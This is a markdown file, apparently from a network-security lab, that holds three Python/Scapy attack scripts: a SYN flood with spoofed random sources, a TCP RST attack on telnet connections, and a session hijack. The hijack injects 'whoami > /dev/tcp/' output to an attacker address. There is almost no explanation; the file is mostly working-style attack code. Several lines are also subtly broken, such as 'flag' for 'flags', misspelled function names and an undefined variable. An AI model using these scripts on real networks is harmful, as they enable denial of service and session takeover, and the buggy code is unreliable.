# TCP Spoofing

## SYN Flooding attack

```python
from scapy.all import *
from ipaddress import *
from random import *

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23,flag="S")
packet = ip/tcp

while(True):
    packet[IP].src = str(IPv4Address(getrandbits(32)))
    packet[TCP].sport = getrandbit(16)
    packet[TCP].seq = getrandbit(32)
    send(packet,verbose=0)
```

## TCP RST attack on telnet connections

```python
from scapy import *
import subprocess

command = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(command,shell=True, check=True, universal_newlines=True,stdout=subprocess.PIPE).stdout.strip() 

def resetAttack(packet):
    if(packet[TCP].sport == 23 or packet[TCP].dport == 23):
        ip = IP(src=packet[TCP].src, dst=packet[TCP].dst)

        if(Raw in packet):
            tcpSegmentLen = len(packet.getlayer(Raw).load)
        else:
            tcpSegmentLen = 0
        
        tcp = TCP(sport=packet[TCP].sport,dport=packet[TCP].dport,flag="R",seq=packet[TCP].seq+tcpSegmentLen,ack=packet[TCP].ack+tcpSegmentLen)

        packet = ip/tcp
        send(packet,iface=IFACE,verbose=0)

def autoAttack():
    sniff(iface=IFACE,filter="tcp",prn=resetAttack)
```

## TCP session hijacking

```python
from scapy.all import *
import subprocess

command = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd,shell=True, check=True, universal_newlines=True,stdout=subprocess.PIPE).stdout.strip()

attackerIP = "10.9.0.1"
attackerPort = 9090
victimIP = "10.9.0.6"

def hijacking(packet):
    if(packet[IP].src == victimIP and Raw in packet):
        tcpSegmentLen = len(packet.getlayer(Raw).load)
        ip = IP(src=packet[IP].src,dst=packet[IP].dst)
        tcp = TCP(sport=packet[TCP].sport,dport=packet[TCP].dport,flag="A",seq=packet[TCP].seq+tcpSegmentLen,ack=packet[TCP].ack+tcpSegmentLen)
        data = f"\r whoami > /dev/tcp/{attackerIP}/{attackerPort} \r"
        packet = ip/tcp/data
        
        send(packet,iface=IFACE,verbose=0)
        exit(0)

def autoHijack():
    sniff(iface=IFACE,filter="tcp",prn=hijacking)
```